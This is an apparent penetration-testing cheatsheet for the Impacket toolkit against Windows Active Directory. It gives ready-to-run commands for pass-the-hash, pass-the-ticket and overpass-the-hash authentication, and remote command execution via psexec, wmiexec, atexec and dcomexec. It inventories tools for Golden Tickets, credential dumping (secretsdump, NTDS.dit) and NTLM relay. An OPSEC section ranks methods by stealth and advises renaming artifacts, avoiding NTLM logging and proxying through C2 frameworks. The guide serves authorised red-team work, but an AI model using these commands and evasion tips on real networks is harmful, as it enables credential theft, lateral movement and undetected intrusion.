---
title: "Impacket — Operational Guide"
description: "Complete Impacket guide: installation, Kerberos configuration, authentication, tool inventory and remote execution."
sidebar:
  order: 3
  label: "Impacket — Operational Guide"
---

> <img src="https://pypi-camo.freetls.fastly.net/652cfe66f331e651740e9712d2b41136e85c4208/68747470733a2f2f6769746875622e636f6d2f757365722d6174746163686d656e74732f6173736574732f31346165643730302d306336652d343836352d616335332d363836623931383734663530" alt="Impacket" style="height: 40px; margin-bottom: 8px;" />
> 
> Complete operational guide for Impacket v0.13.1 (Fortra). Covers installation, Kerberos environment setup, authentication methods, 60+ tool inventory and remote execution OPSEC comparison.
> 
> **Official Repo:** [fortra/impacket](https://github.com/fortra/impacket)

---

## Installation

### pipx (Recommended)
```bash
sudo apt install pipx
pipx ensurepath
python3 -m pipx install impacket
```

### Virtual Environment (Development)
```bash
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
pip install .
```

### Kali Linux
```bash
sudo apt install python3-impacket impacket-scripts
# Scripts accessible as impacket-psexec, impacket-secretsdump, etc.
```

### Docker
```bash
git clone https://github.com/fortra/impacket.git
cd impacket
docker build -t impacket:latest .
docker run -it --rm -v /tmp/loot:/loot impacket:latest
```

| Method | Use Case |
|--------|----------|
| `pipx` | Daily pentesting; easy to update |
| Virtual Env | Development, testing specific branches |
| `apt` (Kali) | Quick setup; no manual maintenance |
| Docker | Complete isolation; no host dependencies |

> **Note:** On modern distros with PEP 668, direct `pip install` fails. Use `pipx` or `venv`.

---

## Kerberos Environment Setup

### DNS — Name Resolution

Kerberos relies on FQDNs. IPs fail with `KDC_ERR_S_PRINCIPAL_UNKNOWN`.

```bash
# /etc/hosts — quick and precise
10.0.1.51    dc01.corp.local    corp.local
10.0.1.52    srv01.corp.local

# /etc/resolv.conf — use DC as DNS
nameserver 10.0.1.51
search corp.local
```

### Clock Synchronization

Kerberos rejects requests if clock differs from DC by more than **5 minutes**.

```bash
# Check DC time
nmap --script smb2-time -p 445 <DC_IP>

# Sync
sudo timedatectl set-ntp off
sudo rdate -n <DC_IP>

# Without changing system clock
faketime -f "+2h" python3 GetUserSPNs.py ...
```

### /etc/krb5.conf (Optional)

Impacket does not require `krb5.conf` — handles Kerberos internally with `-dc-ip` and `-k`. Only needed for system tools like `kinit` or `klist`.

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local
        admin_server = dc01.corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

### Kerberos Tickets (.ccache)

```bash
# Get TGT with password
getTGT.py corp.local/user:password -dc-ip 10.0.1.51

# Get TGT with NTLM hash (Overpass-the-Hash)
getTGT.py corp.local/user -hashes :<NThash> -dc-ip 10.0.1.51

# Get TGT with AES key (Pass-the-Key)
getTGT.py corp.local/user -aesKey <key> -dc-ip 10.0.1.51

# Convert between formats
ticketConverter.py ticket.kirbi ticket.ccache   # Windows → Linux
ticketConverter.py ticket.ccache ticket.kirbi   # Linux → Windows

# Set ticket for use
export KRB5CCNAME=/path/to/ticket.ccache

# Use with any tool
psexec.py corp.local/user@dc01.corp.local -k -no-pass -dc-ip 10.0.1.51
```

---

## Authentication — Connection Formats

Standard format: `DOMAIN/user:password@target`

### Password

```bash
psexec.py CORP/admin:P@ssw0rd@192.168.1.10

# Omit for interactive prompt
psexec.py CORP/admin@192.168.1.10

# Local account (no domain)
psexec.py ./admin:password@192.168.1.10
```

### Pass-the-Hash (NTLM)

```bash
psexec.py CORP/admin@10.0.1.10 -hashes :<NThash>

# With explicit null LM hash
psexec.py CORP/admin@10.0.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:<NThash>
```

### Pass-the-Ticket (Kerberos)

```bash
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py CORP/admin@dc01.corp.local -k -no-pass -dc-ip 10.0.1.51
```

> **Important:** With `-k` (Kerberos), target MUST be a FQDN. IPs cause SPN mismatch failure.

### Pass-the-Key (AES)

```bash
# AES-256 (64 hex chars)
wmiexec.py CORP/admin@10.0.1.10 -aesKey <hex_aes256_key>

# AES-128 (32 hex chars) — auto-detected
wmiexec.py CORP/admin@10.0.1.10 -aesKey <hex_aes128_key>
```

### Overpass-the-Hash (NTLM → Kerberos TGT)

```bash
# Request TGT using NTLM hash
getTGT.py -hashes :<NThash> CORP/admin

# Use resulting TGT
export KRB5CCNAME=admin.ccache
psexec.py CORP/admin@dc01.corp.local -k -no-pass
```

| Scenario | FQDN | IP |
|----------|------|----|
| NTLM (`-hashes`) | Works | Works |
| Kerberos (`-k`) | **Required** | Fails (SPN mismatch) |
| `-dc-ip` flag | N/A | Always IP |

| Flag | Purpose |
|------|----------|
| `-hashes LM:NT` | NTLM hash authentication |
| `-k` | Use Kerberos authentication |
| `-no-pass` | Don't prompt for password |
| `-dc-ip <IP>` | Specify Domain Controller IP |
| `-aesKey <key>` | AES key for Kerberos |
| `-target-ip <IP>` | Target IP (with FQDN + Kerberos) |
| `-debug` | Enable debug output |

---

## Tool Inventory

### Remote Execution
| Script | Description |
|--------|-------------|
| `psexec.py` | Remote command execution via SMB — creates a service, uploads executable. |
| `smbexec.py` | Semi-interactive shell via SMB — creates temporary service and .bat files. |
| `wmiexec.py` | Remote execution via WMI (DCOM) — semi-interactive, no files dropped. |
| `atexec.py` | Executes commands via the Task Scheduler service (ATSVC). |
| `dcomexec.py` | Executes commands via DCOM (MMC20, ShellWindows). |
| `wmipersist.py` | Creates WMI event subscriptions for persistence. |

### Kerberos
| Script | Description |
|--------|-------------|
| `getTGT.py` | Requests a Ticket Granting Ticket (TGT) using password, hash, or AES key. |
| `getST.py` | Requests a Service Ticket (ST) given a TGT. Supports S4U delegation. |
| `GetNPUsers.py` | AS-REP Roasting — retrieves TGTs for users without pre-authentication. |
| `GetUserSPNs.py` | Kerberoasting — requests TGS tickets for accounts with SPNs. |
| `ticketer.py` | Creates Golden Tickets and Silver Tickets. |
| `ticketConverter.py` | Converts between kirbi and ccache Kerberos ticket formats. |
| `describeTicket.py` | Displays detailed information from .ccache ticket files. |
| `getPac.py` | Retrieves and displays PAC information from Kerberos tickets. |
| `goldenPac.py` | Exploits MS14-068 to forge PAC and gain domain admin. |
| `raiseChild.py` | Automates child-to-parent domain privilege escalation. |
| `keylistattack.py` | Implements Kerberos Key List attack to abuse RODCs and Azure AD. |

### SMB / MSRPC
| Script | Description |
|--------|-------------|
| `smbclient.py` | Interactive SMB client — browse shares, list VSS snapshots. |
| `smbserver.py` | Creates an SMB server to host files or capture NTLM hashes. |
| `rpcdump.py` | Dumps the RPC endpoint mapper to list registered services. |
| `rpcmap.py` | Scans for accessible MSRPC interfaces. |
| `samrdump.py` | Enumerates domain users and groups via SAMR. |
| `lookupsid.py` | Brute-forces SIDs to enumerate users and groups. |
| `services.py` | Remotely manages Windows services. |
| `reg.py` | Remote registry access — query, add, modify, delete. |
| `netview.py` | Enumerates logged-on users, shares, and sessions. |
| `net.py` | Windows `net.exe`-like functionality. |

### LDAP / Active Directory
| Script | Description |
|--------|-------------|
| `GetADUsers.py` | Enumerates AD users via LDAP. |
| `GetADComputers.py` | Retrieves computer object information via LDAP. |
| `findDelegation.py` | Lists delegation relationships (unconstrained, constrained, RBCD). |
| `GetLAPSPassword.py` | Extracts LAPS v2 passwords using MS-GKDI. |
| `addcomputer.py` | Adds a computer account to the domain. |
| `rbcd.py` | Manages Resource-Based Constrained Delegation properties. |
| `dacledit.py` | Reads, writes, removes, and restores ACEs in a DACL. |
| `owneredit.py` | Modifies the owner of AD objects. |

### MSSQL
| Script | Description |
|--------|-------------|
| `mssqlclient.py` | Interactive MSSQL client with xp_cmdshell and NTLM coercion. |
| `mssqlinstance.py` | Discovers MSSQL instances via SQL Browser service. |

### Secrets Extraction
| Script | Description |
|--------|-------------|
| `secretsdump.py` | Dumps SAM, LSA secrets, cached credentials, and NTDS.dit. |
| `mimikatz.py` | RPC-based mimikatz implementation. |
| `dpapi.py` | Decrypts DPAPI-protected secrets. |

### Network / Relay
| Script | Description |
|--------|-------------|
| `ntlmrelayx.py` | Relays NTLM authentication to SMB, LDAP, HTTP, MSSQL, etc. |
| `smbserver.py` | SMB server for hash capture or file hosting. |
| `karmaSMB.py` | SMB server that responds to all file requests. |

### Utilities
| Script | Description |
|--------|-------------|
| `exchanger.py` | Microsoft Exchange interaction tool. |
| `getArch.py` | Determines architecture (32/64-bit) via MSRPC. |
| `changepasswd.py` | Changes a user's password remotely. |
| `Get-GPPPassword.py` | Extracts and decrypts Group Policy Preferences (GPP) passwords. |
| `machine_role.py` | Retrieves host role and domain details. |
| `esentutl.py` | ESE database (NTDS.dit) parser utility. |

---

## Remote Execution — OPSEC Comparison

| Tool | Protocol | Service | Files on Disk | Shell | OPSEC | Port |
|------|----------|---------|--------------|-------|-------|------|
| `psexec.py` | SMB → .exe → Service | YES (Event 7045) | YES (.exe) | Semi-interactive | [NOISY] | 445 |
| `smbexec.py` | SMB → .bat → Temp service | Temporary | YES (.bat) | Semi-interactive | [HIGH] | 445 |
| `wmiexec.py` | WMI/DCOM → Win32_Process.Create() | NO | YES (output) | Semi-interactive | [MODERATE] | 135 + RPC |
| `atexec.py` | Task Scheduler (ATSVC) | NO (task) | YES (output) | Single command | [MODERATE] | 445 |
| `dcomexec.py` | DCOM (MMC20, ShellWindows) | NO | Minimal | Semi-interactive | [STEALTHY] | 135 + RPC |

### psexec.py
```bash
psexec.py CORP/admin:password@10.0.1.10
```
- Uploads executable (RemComSvc) to `ADMIN$`
- Creates and starts Windows service
- **Artifacts:** Event ID 7045, executable on disk, named pipe
- **Parent process:** `services.exe` → `cmd.exe`

### smbexec.py
```bash
smbexec.py CORP/admin:password@10.0.1.10
```
- Writes commands to `.bat` in `ADMIN$`
- Creates temporary service
- **Artifacts:** Temporary service, `.bat` files in `C:\Windows\Temp\`
- **Parent process:** `services.exe` → `cmd.exe`

### wmiexec.py [PREFERRED]
```bash
wmiexec.py CORP/admin:password@10.0.1.10
```
- Uses WMI via DCOM/RPC with `Win32_Process.Create()`
- No service creation — blends with legitimate admin traffic
- **Artifacts:** WMI logs, `__output` file in ADMIN$
- **Parent process:** `wmiprvse.exe` → `cmd.exe`

### atexec.py
```bash
atexec.py CORP/admin:password@10.0.1.10 "whoami"
```
- Creates scheduled task
- **Artifacts:** Event ID 4698, output file
- **Parent process:** `taskeng.exe`/`svchost.exe` → `cmd.exe`

### dcomexec.py [MAXIMUM STEALTH]
```bash
dcomexec.py CORP/admin:password@10.0.1.10
dcomexec.py -object MMC20 CORP/admin:password@10.0.1.10
dcomexec.py -object ShellWindows CORP/admin:password@10.0.1.10
```
- Uses legitimate DCOM objects via RPC
- **Artifacts:** DCOM/RPC traffic, unusual but legitimate parent process
- **Parent process:** `mmc.exe` or `explorer.exe` → `cmd.exe`

### OPSEC Ranking (Stealthiest → Noisiest)

1. `dcomexec.py` — Native DCOM, minimal artifacts
2. `wmiexec.py` — No service, native WMI
3. `atexec.py` — Task Scheduler, creation is logged
4. `smbexec.py` — Temporary service, .bat on disk
5. `psexec.py` — Persistent service, uploaded binary, named pipe

> **OPSEC Tips:**
> - Modify Impacket source code to change default service names and output filenames
> - Prefer `-k` (Kerberos) over NTLM to avoid NTLM logging
> - Proxy traffic through C2 SOCKS (Cobalt Strike, Sliver)

---

## Related Cheatsheets

- [AD Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — Kerberoasting, DCSync, ACL abuse
- [Impacket — Kerberos & Credential Attacks](/en/metodologias/active-directory/impacket-attacks/) — Golden/Silver Tickets, secretsdump, relay, ADCS
- [Attacking Enterprise Networks](/en/metodologias/active-directory/attacking-enterprise-networks/) — End-to-end flow
